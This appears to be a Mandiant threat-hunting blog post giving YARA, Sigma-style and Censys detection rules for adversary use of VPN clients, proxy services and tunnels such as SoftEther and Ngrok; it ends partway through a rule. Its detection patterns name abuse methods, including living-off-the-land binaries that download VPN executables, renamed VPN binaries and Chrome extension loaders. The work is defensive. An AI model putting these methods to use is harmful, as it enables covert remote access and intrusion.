class="nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-wNfPc-cGMI2b"><section class="DA9Qj nRhiJb-ObfsIf nRhiJb-fmcmS-oXtfBe"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Mandiant </h5><p class="nRhiJb-qJTHM khCp7b"></p></div></section></div></section><div class="nRhiJb-DARUcf"><div class="nRhiJb-ObfsIf nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Written by: Jared Wilson</p>
<hr></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h2>Why Are We Here?</h2>
<p>When considering an attack lifecycle from an adversarial perspective, the adversary has a few options on how to proceed at each step. One of questions that needs to be answered is whether the adversary will use publicly known malware (i.e. BEACON), custom built-from-the-ground-up malware (i.e. HAMMERTOSS), or legitimate software and services (i.e. <a href="https://www.softether.org/" rel="noreferrer noopener" target="_blank">SoftEther Virtual Private Network</a>) that provide the necessary functionality to complete said step.</p>
<p>Each option has upsides and downsides: Publicly known malware can be extremely cheap but also can be easy to detect since it has been in the public eye for some time. Custom malware can be extremely stealthy given its unique code-base but also very expensive in time and/or money given it needs to be developed prior to use. Legitimate software and services can also be stealthy due to their camouflage effect into “normal network activity” but also may not provide precisely the type of functionality desired, since it was not written to be used for the function it is being considered for.</p>
<p>Mandiant has observed all three of these theoretical “options” throughout research and engagements from formidable adversaries, making each method valuable for hunting, collections, and analysis.</p>
<p>However, the purpose of the content you are about to read is to discuss the third and, at some lunch tables, the least discussed option: legitimate Virtual Private Network (VPN) software, proxy services, and localhost tunnels. This content will walk through each of these three remote access methods to further expand the defender’s hunting and detection repertoire against VPN software, proxy services, and tunnels.</p>
<h2>Defining Differences</h2>
<h3><strong>Virtual Private Network Software</strong></h3>
<div>
<p>To understand VPN software, one must understand a VPN: A virtual private network is an encrypted connection over the Internet from a device to a network. The encrypted connection helps ensure that sensitive data is safely transmitted. It prevents unauthorized people from eavesdropping on the traffic and allows the user to conduct work <a href="https://www.checkpoint.com/cyber-hub/network-security/what-is-vpn/" rel="noopener" target="_blank">remotely</a>.</p>
<p>In the following, <strong>VPN software </strong>will be defined as any software artifacts which facilitate the use of a VPN connection (SoftEther VPN Client, OpenVPN Client, etc).</p>
<p><strong>Proxy Services</strong></p>
<p>In computer science a proxy is a server which resides between the client making a request and the requested destination server. Proxies can be used for multiple purposes including network log collection, cache repository, and providing anonymized internet access. A <strong>proxy service</strong> is an online resource that allows a user to get the benefits of a proxy with none of the infrastructure concerns (RSocks, HideMyAss, Hide.Me, etc).</p>
<p><strong>LocalHost Tunneling</strong></p>
<p>Both VPN software and proxy services facilitate the outbound connection from client to server, while localhost tunneling is similar, it facilitates the connection from the external network back to the client. This is done by what is commonly called “exposing localhost” (Ngrok, LocalTunnel, Localhost.Run, etc).</p>
<h2>Detect from all Directions</h2>
<p>Brainstorming over the different hunt and detection directions led to the following conclusion: Detection of legitimate software and services at this scale cannot be a narrow implementation of a single detection discipline, but rather, expand across multiple disciplines.</p>
<h3><strong>Brainstorming Hunting &amp; Detection Directions</strong></h3>
<p>Initiating a large-scale hunting and detection operation like this requires brainstorming through the, hopefully many, different hunting and detection options available to each organization. For example: should the organization have no ability to run snort signatures against network traffic then that type of direction can take the backseat to other primary detection methods.</p>
<p>Additionally, when hunting for a technology being utilized as a methodology it is easy to fall into a “whac-a-vendor” type approach focusing on each vendor’s version of the technology (i.e. Detection on SoftEther, NordVPN, Ngrok, etc). This is not a terrible approach, as it has its merits, but is not ideal. In the following sections there will be detections highlighted covering SoftEther VPN, Ngrok, and others. These are covered due to the threat dense nature of their use.The ideal hunting process would use more methodology driven detection, being more vendor agnostic, as highlighted in the following Hunting Direction sections.</p>
<h2>VPN Client Directions</h2>
<h3><strong>Files that are wrapped around suspected VPN files</strong></h3>
<div>
<p><u>Concern</u>: Adversaries may use innocuous files that house these VPN files inside of themselves to masquerade as something other than a remote access software.</p>
<p><u>Direction</u>: Use detection logic that can peer into the construct of the file itself to identify the VPN artifacts layered below the innocuous files.</p>
<p>The following can be considered hunting detections and directions for a variety of files wrapped around VPN equities and/or VPN files.</p>
<ul>
<li>Rich Text Format files with Embedded Hex Payloads</li>
<li>Open Office XML files with Embedded VPN Target Domains</li>
<li>Optical Disc Image (ISO Image) files with VPN File or Domain References</li>
<li>Mach Object (Mach-O) file with VPN File or Domain References</li>
</ul>
<h3><strong>RTF Embedded Hex Payload with Hex VPN File References<br></strong></h3>
<pre><code>rule M_Hunting_VPNEngine_RTF_Embedded_1 {
    meta:
      description = &quot;Detects a suspicious string often used in PE files in a hex encoded object stream along with a VPN or proxy filename in the hex object.&quot;
      author = &quot;Mandiant&quot;
      md5 = &quot;befec87a9742ba8e8f6e61e1133f55fb&quot;
   strings:
      $pe = &quot;546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f6465&quot; ascii 
      $mz = /4d5a[a-zA-Z0-9]{19,21}ffff/      
      $vpn1 = /56504e[a-zA-Z0-9]{0,20}(2e657865|2e646c6c)/ ascii
      $vpn2 = /76706e[a-zA-Z0-9]{0,20}(2e657865|2e646c6c)/ ascii
      $vpn3 = /70726f7879[a-zA-Z0-9]{0,20}(2e657865|2e646c6c)/ ascii
      $vpn4 = /50726f7879[a-zA-Z0-9]{0,20}(2e657865|2e646c6c)/ ascii
      $vpn5 = /50524f5859[a-zA-Z0-9]{0,20}(2e657865|2e646c6c)/ ascii
   condition:
      filesize &lt; 15MB and (uint16(0) == 0x5C7B) and ($pe or $mz) and (1 of ($vpn*))
}</code></pre>
<h3><strong>OOXML with Embedded VPN Target Domains</strong></h3>
<pre><code>rule M_Hunting_VPNEngine_OOXML_Target_1
  {
      meta:
        description = &quot;Detects an external relationship link in an OOXML with a VPN or proxy domain.&quot;
        author = &quot;Mandiant&quot;
      strings:
        $relationship_external = /TargetMode=[\&quot;\&#39;]External[\&quot;\&#39;]/ ascii nocase wide
        $anchor = &quot;&quot;
        $s1 = &quot; Target=&quot; ascii nocase
        $s2 = &quot; TargetMode=&quot; ascii nocase
        $s3 = &quot; Type=&quot; ascii nocase
        $s4 = &quot; Id=&quot; ascii nocase
        $re = /Target=[\&quot;\&#39;][^\&quot;\&#39;]{0,100}(vpn|proxy).{0,100}/ ascii nocase
      condition:
         (filesize &lt; 10KB) and $anchor and $relationship_external and (1 of ($s*)) and $re
  }
  </code></pre>
<h3><strong>ISO Files with VPN File or Domain References</strong></h3>
<pre><code>rule M_Hunting_VPNEngine_ArchiveEngine_ISOWithEmbeddedVPN_1
  {
      meta:
          author = "Mandiant"
          description = "Looking for ISO files with embedded payloads utilizing VPN strings."
          md5 = "4c5f27d28f369da5d5ecce947bb22943"
      strings:
          $s1 = /vpn[^\.]{0,50}\.(exe|dll|lnk|hta|rtf|ps1|vbs|vbe|pdf|doc)/ ascii nocase fullword
          $s2 = /proxy[^\.]{0,50}\.(exe|dll|lnk|hta|rtf|ps1|vbs|vbe|pdf|doc)/ ascii nocase fullword
          $s3 = /vpn[a-zA-Z0-9\.]{0,50}\.(com|io|ru|org|net)/ ascii nocase 
          $s4 = /proxy[a-zA-Z0-9\.]{0,50}\.(com|io|ru|org|net)/ ascii nocase 
          $s5 = "remote access" ascii nocase wide fullword
          $s6 = /localhost[^a-zA-Z0-9]{0,5}tunnel/ ascii nocase fullword
      condition:
         uint32(0x8000) == 0x30444301 and uint32(0x8004) == 0x00013130 and any of them
  }
  </code></pre>
<h3><strong>Mach-O Files with VPN File or Domain References</strong></h3>
<pre><code>rule M_Hunting_MacOS_VPNEngine_MachO_FEBeta_1
  {
      meta:
          author = &quot;Mandiant&quot;
          description = &quot;This rule looks for Mach-O files with strings indicating relationship with a VPN client or domain.&quot;
          md5 = &quot;6de8cc7217cb3e0c235fcdde83b1140b&quot;
      strings:
          $s1 = /vpn[^\.]{0,50}\.(exe|dll|lnk|hta|rtf|ps1|vbs|vbe|pdf|doc)/ ascii fullword nocase
          $s2 = /proxy[^\.]{0,50}\.(exe|dll|lnk|hta|rtf|ps1|vbs|vbe|pdf|doc)/ ascii fullword nocase
          $s3 = /vpn[a-zA-Z0-9\.]{0,50}\.(com|io|ru|org|net)/ ascii nocase
          $s4 = /proxy[a-zA-Z0-9\.]{0,50}\.(com|io|ru|org|net)/ ascii nocase
          $s6 = /localhost[^a-zA-Z0-9]{0,5}tunnel/ ascii fullword nocase
      condition:
          filesize &lt; 15MB and (uint32(0) == 0xBEBAFECA or uint32(0) == 0xFEEDFACE or uint32(0) == 0xFEEDFACF or uint32(0) == 0xCEFAEDFE) and (1 of them)
  }
  </code></pre>
<h3>OOXML with Embedded Files with VPN Equities</h3>
<pre><code># author = &quot;Mandiant&quot; ; type = &quot;OOXML&quot; ; md5 = 
&quot;a2d34e8c543aef78766b37dcaa5f7686&quot;
M_Hunting_VPNEngine_OOXML_Target_1;Engine:51-
255,Container:CL_TYPE_ZIP,Target:0;(0&amp;1&amp;2)&amp;(3|4|5|6);3c3f786d6c;3c773a646f637
56d656e74;353436383639373332303730373236663637373236313664;373637303665;35363
5303465;37303732366637383739;35303732366637383739</code></pre>
<h3>Intelligence gathering via VPN client configuration files</h3>
<p><u>Concern</u>: Many VPN clients take configuration files as input, the client itself is the concern, however, the configuration files provide intelligence insight and potential pivot points.</p>
<p><u>Direction</u>: Use file-based analysis to identify common VPN client configuration files in public stores or on systems where these files would not be expected.</p>
<h3>SoftEther VPN Configuration Identification</h3>
<pre><code>{
  meta:
  author = &quot;Mandiant&quot;
  md5 = &quot;2586bb9e27a4b3da4ed0f5d15883f84e&quot;
  description = &quot;Rule looks for SoftEther config file.&quot;
  strings:
  $configfile = &quot;Software Configuration File&quot; ascii fullword
  $softether1 = &quot;softether&quot; ascii fullword nocase
  $softether2 = &quot;EnableSoftEtherKernelModeDriver&quot; nocase
  $topFields1 = &quot;ListenerList&quot;
  $topFields2 = &quot;LocalBridgeList&quot;
  $topFields3 = &quot;ServerConfiguration&quot;
  $topFields4 = &quot;VirtualHUB&quot;
  condition:
  filesize &lt; 1MB and $configfile and (1 of ($softether*)) and (1 of ($topFields*))
  }
  </code></pre>
<h3>Ngrok VPN Configuration Identification</h3>
<pre><code>rule M_Hunting_VPNEngine_NgrokConfig_1
  {
  meta:
  author = &quot;Mandiant&quot;
  description = &quot;Rule looks for Ngrok YML config file.&quot;
  md5 = &quot;5d1dbfdc47e820605fedabb98cf17dd5&quot;
  strings:
  $header = &quot;authtoken:&quot; ascii
  $tokenRE = /authtoken:\s+[a-zA-Z0-9]{24,30}_[a-zA-Z0-9]{16,22}/ ascii
  $tunnel = &quot;tunnels:&quot; ascii
  condition:
  filesize &lt; 1MB and $header in (0..20) and $tokenRE and $tunnel
  }
  rule M_Hunting_VPNEngine_NgrokConfig_2
  {
  meta:
  author = &quot;Mandiant&quot;
  description = &quot;Rule looks for Ngrok YML config file.&quot;
  md5 = &quot;5d1dbfdc47e820605fedabb98cf17dd5&quot;
  strings:
  $header = &quot;authtoken:&quot; ascii
  $tokenRE = /authtoken:\s[a-zA-Z0-9]{26,30}_[a-zA-Z0-9]{19,22}/ ascii
  condition:
  filesize &lt; 1MB and $header at 0 and $tokenRE
  }
  </code></pre>
<p><strong>Process execution that is masquerading as something other than what it is, a VPN client or software.</strong></p>
<p><u>Concern</u>: It is common to see binaries with modified names, like <a href="https://www.virustotal.com/gui/file/d9758b47030468f85fa4b06e689acab24cba1be3c1a16191776edae6d8a367ff/details" rel="noopener" target="_blank">this SoftEther VPN Bridge renamed as iexplore.exe and conhost.exe</a>, and other aspects to mask the true purpose of the file.</p>
<p><u>Direction</u>: Avoid relying solely on filename-based detections hunting more for methodologies that will detect named or renamed processes, files, etc. Use process-based detection logic to identify switches, actions, and connections common to VPN components. Even lean on string-based equities to identify a binary’s true identity or intent.</p>
<p><strong>SoftEther VPN Detection by Network Connections</strong></p>
<p> </p>
<pre><code>title: 'Renamed SoftEtherVPN by Network Connections (METHODOLOGY)'
  description: 'Detect the activity of a renamed SoftEther VPN binary by detecting known domain connections.'
  author: Mandiant
  date: '2022-06-15'
  status: hunting
  logsource:
      product: 'FireEye HX'
  detection:
      selectionDomain:
          urlMonitorEvent Hostname|contains:
              - 'get-my-ip.ddns.softether-network.net'
              - 'keepalive.softether.org'
              - 'update-check.softether-network.net'
          urlMonitorEvent Hostname|re: 'vpn[0-9a-zA-Z]{1,50}\.softether.net'
      filterProcessName:
          urlMonitorEvent Process|contains:
              - 'softether'
              - 'vpnbridge'
              - 'vpnclient'
              - 'vpncmgr'
              - 'vpngateplugin'
              - 'vpninstall'
              - 'vpnserver'
              - 'vpnsetup'
              - 'vpnmgr'
              - 'zsatunnel'
      condition: selectionDomain and not filterProcessName
  fields:
      - "urlMonitorEvent Process"
      - "urlMonitorEvent Hostname"
      - "urlMonitorEvent Type"
      - "urlMonitorEvent Commandline"
  falsepositives:
      - "Known proxy services like ZScaler."
  level: "medium"
  </code></pre>
<p><strong>SoftEther VPN Detection by Registry Modifications</strong></p>
<p> </p>
<pre><code>title: 'Renamed SoftEtherVPN by Registry Modifications (METHODOLOGY)'
  description: 'Detect the activity of a SoftEther VPN binary by detecting registry modifications.'
  author: Mandiant
  date: '2022-06-15'
  status: hunting
  logsource:
      product: 'FireEye HX'
  detection:
      selectionType:
          regKeyEvent Type: 1
      selectionStaticPath:    
          regKeyEvent Path|contains: 'System\CurrentControlSet\Services\SEVPNCLIENT'
      selectionREPath:
          regKeyEvent Path|re: 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\[a-zA-Z0-9_\s-]{0,100}?SoftEther[a-zA-Z0-9_\.\s-]{0,100}'
      condition: selectionType and (selectionStaticPath or selectionREPath)
  fields:
      - "regKeyEvent Process"
      - "regKeyEvent Path"
      - "regKeyEvent Key"
      - "regKeyEvent Value"
  falsepositives:
      - "Unknown"
  level: "medium"
  </code></pre>
<p><strong>Generic VPN Switches from Commandline (Hunting)</strong></p>
<p>Hunting for common VPN equities in process commandline switches to include but not limited to vpn, proxy, sstp, and l2tp.</p>
<p> </p>
<pre><code>
  title: 'VPN-like Process with Known Switches (METHODOLOGY)'
  description: 'Detect suspected VPN binaries by known commandline switches.'
  author: Mandiant
  date: '2022-06-15'
  status: hunting
  logsource:
      product: 'FireEye HX'
  detection:
      selectionProcessType:
          processEvent eventType: "start"
      selectionSwitchOptions1:
          processEvent processCmdLine|contains:
              - ' --vpn'
              - ' --proxy'
      selectionSwitchOptionsMethod1:
          processEvent processCmdLine|contains:
              - 'ssl'
              - 'l2tp'
              - 'sstp'
      selectionSwitchOptions2:
          processEvent processCmdLine|contains:
              - 'vpn'
              - 'proxy'
      selectionSwitchOptionsMethod2:
          processEvent processCmdLine|contains:
              - ' --ssl'
              - ' --l2tp'
              - ' --sstp'
      condition: selectionProcessType and ((selectionSwitchOptions1 and selectionSwitchOptionsMethod1) or (selectionSwitchOptions2 and selectionSwitchOptionsMethod2))
  fields:
      - "processEvent processCmdLine"
      - "processEvent Process"
      - "processEvent Username"
      - "processEvent Md5"
  falsepositives:
      - "Unknown"
  level: "low"
  </code></pre>
<p><strong>Generic VPN Domains from the Process (Hunting)</strong></p>
<p>Identifying processes that initiate a network connection to VPN or proxy domains with the following regular expression.</p>
<p>(vpn|proxy)\.[^.]{1,100}\.(net|com|org|io|ru)</p>
<p>This leans heavily on a common practice to use domains in the format of vpn.company[.]com or proxy.company[.]com. While this is not completely inclusive, it leads to enough hunting opportunities to get started and if they are exhausted the regular expression can be loosened.</p>
<p> </p>
<pre><code>
  title: 'Generic VPN Domains from the Process (Hunting)'
  description: 'Identifying processes that initiate a network connection to VPN or proxy domains with the following regular expression.'
  author: Mandiant
  date: '2022-06-15'
  status: hunting
  logsource:
      product: 'FireEye HX'
  detection:
      selectionDomain:
          urlMonitorEvent Hostname|re:
              - 'vpn\.[^.]{1,100}\.(net|com|org|io)'
              - 'proxy\.[^.]{1,100}\.(net|com|org|io)'
      filterProcessName:
          urlMonitorEvent Process|contains:
              - 'proxy'
              - 'vpn'
   
      condition: selectionDomain and not filterProcessName
  fields:
      - "urlMonitorEvent Process"
      - "urlMonitorEvent Hostname"
      - "urlMonitorEvent Type"
      - "urlMonitorEvent Commandline"
  falsepositives:
      - "Known proxy services like ZScaler."
      - "Other legitimate in-house proxies."
  level: "low"
  </code></pre>
<p><strong>Generic VPN User Agents from the Process (Hunting)</strong></p>
<p>Identifying the use of legitimate VPN agents leads to a plethora of hunting opportunities. Searching for VPN and proxy keywords within HTTP user-agent strings will drive these opportunities. Applying tuning with a known authorized software list or authorized VPN/proxy domains can reduce false positives.</p>
<p> </p>
<pre><code>
  title: 'Generic VPN User Agents from the Process (Hunting)'
  description: 'Searching for VPN and proxy keywords within HTTP user-agent strings.'
  author: Mandiant
  date: '2022-06-15'
  status: hunting
  logsource:
      product: 'FireEye HX'
  detection:
      selectionUserAgent:
          urlMonitorEvent userAgent|contains:
              - 'proxy'
              - 'vpn'
      filterHostname:
          urlMonitorEvent Hostname|contains:
              - 'vpn'
              - 'proxy'
      condition: selectionUserAgent and not filterHostname
  fields:
      - "urlMonitorEvent Process"
      - "urlMonitorEvent Hostname"
      - "urlMonitorEvent Type"
      - "urlMonitorEvent Commandline"
  falsepositives:
      - "Known proxy services like ZScaler."
      - "Other legitimate in-house proxies."
      - "FortiSSLVPN"
      - "GoogleImageProxy"
      - "ESET Security proxy detection"
  level: "low"
  </code></pre>
<p><strong>Generic SoftEther VPN Equities (Hunting)</strong></p>
<p>Utilizing unique equities to detect known SoftEther functionality within a binary will help bypass process name detection and identify functionality - such as with UNC3500 in the use-case discussed below.</p>
<p> </p>
<pre><code>
  rule M_Hunting_Linux_VPNEngine_GenericSoftEther_1
  {
      meta:
          author = &quot;Mandiant&quot;
          description = &quot;Rule looks for SoftEther generic terms in samples.&quot;
      strings:
          $domain = &quot;update-check.softether-network.net&quot; ascii fullword
          $keepalive = &quot;keepalive.softether.org&quot;
          $vpn = &quot;SoftEther Corporation&quot; ascii fullword
      condition:
          filesize &lt; 10MB and uint32(0) == 0x464c457f and all of them
  }
  </code></pre>
<hr>
<p><strong>Files or processes that, when executed, reach outbound and download a know VPN client</strong></p>
<p><u>Concern</u>: There are hundreds of ways to perform remote downloads like using <a href="https://lolbas-project.github.io/" rel="noopener" target="_blank">living off the land binaries</a> or via custom code. However, if a process is seen downloading a VPN client in a method that does not follow normal user behavior, the intent may be to utilize this client for malicious behavior.</p>
<p><u>Direction</u>: Identify outbound connections to download VPN client software by living off the land binaries.</p>
<p><strong>Living off the Land Binaries with VPN Domains</strong></p>
<p>A <em>Living off the Land </em>event <a href="https://www.youtube.com/watch?v=j-r6UonEkUw" rel="noopener" target="_blank">describes</a> a computer event in which actors use legitimate software and functions available in the system to perform malicious actions on it. These legitimate software binaries are considered <em>Living off the Land Binaries </em>(LoLBins) and when combined with VPN or proxy methodologies allow for robust and camouflaged operations.</p>
<p>Utilizing process data to hunt for these LoLBins that have download functionality in combination with VPN and proxy domains may lead to identifying their abuse.</p>
<p> </p>
<pre><code>title: 'Living off the Land Binaries with VPN Domains (Hunting)'
description: 'Utilizing process data to hunt for LoLBins that have download functionality in combination with VPN and proxy domains may lead to identifying their abuse.'
author: Mandiant
date: '2022-06-15'
status: hunting
logsource:
    product: 'FireEye HX'
detection:
    selectionProcessName:
        urlMonitorEvent Process:
            - 'AppInstaller.exe'
            - 'Bitsadmin.exe'
            - 'CertOC.exe'
            - 'CertReq.exe'
            - 'Certutil.exe'
            - 'cmdl32.exe'
            - 'Desktopimgdownldr.exe'
            - 'Diantz.exe'
            - 'Esentutl.exe'
            - 'Expand.exe'
            - 'Extrac32.exe'
            - 'Findstr.exe'
            - 'Finger.exe'
            - 'GfxDownloadWrapper.exe'
            - 'Hh.exe'
            - 'Ieexec.exe'
            - 'Imewdbld.exe'
            - 'Makecab.exe'
            - 'MpCmdRun.exe'
            - 'PrintBrm.exe'
            - 'Replace.exe'
            - 'Squirrel.exe'
            - 'Wsl.exe'
            - 'Xwizard.exe'
    selectionUrl:
        urlMonitorEvent requestUrl|re: '[a-zA-Z0-9\.]{0,50}(vpn|proxy)[a-zA-Z0-9\.]{0,50}\.exe'
    condition: selectionProcessName and selectionUrl
fields:
    - "urlMonitorEvent Process"
    - "urlMonitorEvent Hostname"
    - "urlMonitorEvent requestUrl"
    - "urlMonitorEvent Commandline"
falsepositives:
    - "Unknown"
level: "medium"</code></pre>
<p><strong>Proxy Service Directions</strong></p>
<p><strong>Infrastructure configured to receive VPN or proxy connections</strong></p>
<p><u>Concern</u>: Host-based visibility may be a data source organizations lack, and therefore have difficulty identifying these equities. This leads to lack of detection and hunting directions.</p>
<p><u>Direction</u>: Moving away from the host and into the internet infrastructure hunting, there are numerous <a href="https://search.censys.io/" rel="noopener" target="_blank">tools </a>and <a href="https://www.virustotal.com/gui/home/search" rel="noopener" target="_blank">data sources</a> that allow for identifying infrastructure qualities, which may allow analysts to automate the detection of certain VPN endpoints and servers.</p>
<p><em>Note: This is relevant for all three technologies, VPN clients, proxy services, and tunnels.</em></p>
<p>The following includes a list of different hunting queries focusing in on specific and generic VPN or proxy infrastructure.</p>
<ul>
<li>Generic VPN and Proxy Domains</li>
<li>Generic VPN Certificates</li>
<li>MeFound VPN Service</li>
<li>Hide.Me VPN Service</li>
<li>OpenVPN Services</li>
<li>Cisco IOS SSL VPN Services</li>
<li>Wireguard VPN Infrastructure</li>
<li>SoftEther VPN Infrastructure</li>
<li>Ngrok Service Infrastructure</li>
</ul>
<p><strong>Generic VPN and Proxy</strong></p>
<p><strong><u>VPN Domain</u></strong></p>
<p> </p>
<pre><code>services.tls.certificates.leaf_data.issuer.common_name:/.*\.vpn\..*\.[a-z]{1,4}/</code></pre>
<p><strong><u>Proxy Domain</u></strong></p>
<p> </p>
<pre><code>services.tls.certificates.leaf_data.issuer.common_name:/.*\.proxy\..*\.[a-z]{1,4}/</code></pre>
<p><strong>Generic VPN Cert CN and Org</strong></p>
<p><strong><u>Generic VPN Certificate Common Name and Organization</u></strong></p>
<p> </p>
<pre><code>parsed.issuer.common_name:"VPN" and parsed.subject.organization:"VPN"</code></pre>
<p><strong>Other VPN Service Domains</strong></p>
<p><strong>MeFound</strong></p>
<p> </p>
<pre><code>services.tls.certificates.leaf_data.issuer.common_name:/[^\.]+\.mefound\.com/ 
or 
services.tls.certificates.leaf_data.subject.common_name:/[^\.]+\.mefound\.com/ 
or services.tls.certificates.leaf_data.names:/[^\.]+\.mefound\.com/</code></pre>
<p><strong>Hide.Me Proxy Server</strong></p>
<p> </p>
<pre><code>services.tls.certificates.leaf_data.names:/.*hide\.me.*/ services.tls.certificates.leaf_data.names=hideservers.net</code></pre>
<p><strong>OpenVPN</strong></p>
<p> </p>
<pre><code>services.tls.certificates.leaf_data.subject.organization:"ocvpn" or 
services.tls.certificates.leaf_data.subject.common_name:"ocvpn"</code></pre>
<p><strong>Cisco IOS SSL VPN</strong></p>
<p> </p>
<pre><code>services.http.response.headers.set_cookie:/webvpn[a-z]*=.*/
</code></pre>
<p><strong>Wireguard</strong></p>
<p> </p>
<pre><code>(services.http.response.html_title:/.*WireGuard VPN.*/) or 
(services.http.response.body:/.*Wireguard VPN.*/)
(services.http.response.html_title:/.*Wireguard.*/ or 
services.http.response.body:/.*Wireguard.*/) and not 
((services.http.response.html_title:/.*WireGuard VPN.*/) or 
(services.http.response.body:/.*Wireguard VPN.*/)) and not 
((services.http.response.html_title:/.*Turnkey WireGuard.*/) or 
(services.http.response.body:/.*Turnkey Wireguard.*/))</code></pre>
<p><strong>SoftEther</strong></p>
<p><strong><u>SoftEther on Abused IP Space</u></strong></p>
<p> </p>
<pre><code>services.tls.certificates.leaf_data.subject.common_name:/.*\.softether\.net/ 
AND autonomous_system.name=`HETZNER-AS` 
services.tls.certificates.leaf_data.subject.common_name:/.*softether.net/ 
AND autonomous_system.name=`DIGITALOCEAN-ASN` 
services.tls.certificates.leaf_data.subject.common_name:/.*softether.net/
 AND autonomous_system.name=`AS-CHOOPA` 
services.tls.certificates.leaf_data.subject.common_name:/.*\.softether\.net/ 
AND autonomous_system.name=`OVH`</code></pre>
<p><strong><u>Untrusted SoftEther Certificates</u></strong></p>
<p>Untrusted VPN Custom SoftEther Certificates</p>
<p> </p>
<pre><code>parsed.subject.common_name:/vpn[0-9]{1,15}\.softether\.net/ AND tags.raw: 
"untrusted" AND NOT parsed.subject.common_name:/vpn[0-9]
{1,15}\.softether\.net/</code></pre>
<p>Untrusted VPN Non-Custom SoftEther Certificates</p>
<p> </p>
<pre><code>parsed.subject.common_name:/vpn[0-9]{1,15}\.softether\.net/ AND tags.raw: 
"untrusted"
</code></pre>
<p><strong><u>SoftEther Generic</u></strong></p>
<p>SoftEther VPN Domain on Certificate</p>
<p> </p>
<pre><code>same_service(services.tls.certificates.leaf_data.issuer.common_name:/.*\.softether\.net/ 
AND services.port:443)
</code></pre>
<p>HTTP/S SoftEther VPN IPs</p>
<p> </p>
<pre><code>same_service(services.tls.certificates.leaf_data.issuer.common_name:/.*\.softether\.net/ 
AND (services.service_name=`HTTP` OR
services.extended_service_name=`HTTPS`))</code></pre>
<p>Non-US IP hosting SoftEther VPN domain</p>
<p> </p>
<pre><code>same_service(services.tls.certificates.leaf_data.subject.common_name:/vpn.*softether.net/
AND NOT services.tls.certificates.leaf_data.issuer.country:"US")
</code></pre>
<p><strong>Ngrok Domains</strong></p>
<p><strong><u>Ngrok Domain</u></strong></p>
<p> </p>
<pre><code>services.tls.certificates.leaf_data.names:/.*ngrok.*/</code></pre>
<p><strong><u>Ngrok Inspect Service</u></strong></p>
<p> </p>
<pre><code>same_service(services.http.request.uri:/.*inspect.*/ and 
services.http.request.uri:/.*http.*/ and 
services.http.response.html_title:"ngrok")</code></pre>
<p><strong>ProtonVPN</strong></p>
<p><strong><u>Proton VPN Services</u></strong></p>
<p> </p>
<pre><code>services.tls.certificates.leaf_data.issuer.organizational_unit:protonvpn or 
services.http.response.html_title:protonvpn</code></pre>
<p><strong>Browser Extensions used for Proxy Services</strong></p>
<p><u>Concern</u>: Many proxy services have a companion browser extension and, while not commonly observed, may allow an adversary to use this service.</p>
<p>Additionally, adversaries may use <a href="https://www.virustotal.com/gui/file/e734ec9832f8385eb737dd024eb96d53d0d3cb534a72afb4730db8e7e6162fcc/detection" rel="noopener" target="_blank">loader functionality</a> to access VPN or proxy services via Chrome. This could be observed in PowerShell loader scripts or LNK files where the --load-extension switch can be used with Chrome to load a specific extension.</p>
<p><u>Direction</u>: Narrow focus in file analysis to browser extension artifacts and then within said artifacts for VPN equities. This can be done directly against <a href="https://developer.chrome.com/docs/extensions/mv3/manifest/" rel="noopener" target="_blank">browser extension manifest files</a> or portable executable files.</p>
<p><strong>Loading Chrome VPN or Proxy Extension</strong></p>
<p> </p>
<pre><code>rule M_METHODOLOGY_VPNEngine_LoadVPNProxyChromeExtension_1
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Hunting rule that looks for files containing strings pertaining to execution of Chrome to launch an extension with VPN or proxy equities.&quot;
    strings:
        $r1 = /chrome[^\r\n]*?--load-extension=/ ascii nocase wide
        $s1 = &quot;chrome&quot; ascii wide
        $s2 = &quot;--load-extension=&quot; ascii wide
        $p1 = &quot;vpn&quot; ascii wide fullword nocase
        $p2 = &quot;proxy&quot; ascii wide fullword nocase
    condition:
        filesize &lt; 50KB and all of ($s*) and $r1 and ($p1 or $p2)
}</code></pre>
<p><strong>Chrome Extension Manifest File for Proxies</strong></p>
<p> </p>
<pre><code>rule M_Hunting_VPNEngine_ChromeExtensions_1
{
    meta:
        author = &quot;Mandiant&quot;
        md5 = &quot;995f7d9ca805cce59acbeff82ed4adc6&quot;
    strings:
        $manifest1 = &quot;\&quot;manifest_version\&quot;:&quot; ascii nocase
        $manifest2 = &quot;\&quot;name\&quot;:&quot; ascii nocase
        $manifest3 = &quot;\&quot;version\&quot;:&quot; ascii nocase
        $optional1 = &quot;\&quot;author\&quot;:&quot; ascii nocase
        $optional2 = &quot;\&quot;browser_action\&quot;:&quot; ascii nocase
        $optional3 = &quot;\&quot;content_security_policy\&quot;:&quot; ascii nocase
        $optional4 = &quot;\&quot;default_icon\&quot;:&quot; ascii nocase
        $optional5 = &quot;\&quot;default_locale\&quot;:&quot; ascii nocase
        $optional6 = &quot;\&quot;default_title\&quot;:&quot; ascii nocase
        $optional7 = &quot;\&quot;description\&quot;:&quot; ascii nocase
        $optional8 = &quot;\&quot;differential_fingerprint\&quot;:&quot; ascii nocase
        $optional9 = &quot;\&quot;icons\&quot;:&quot; ascii nocase
        $optional10 = &quot;\&quot;permissions\&quot;:&quot; ascii nocase
        $optional11 = &quot;\&quot;background\&quot;:&quot; ascii nocase
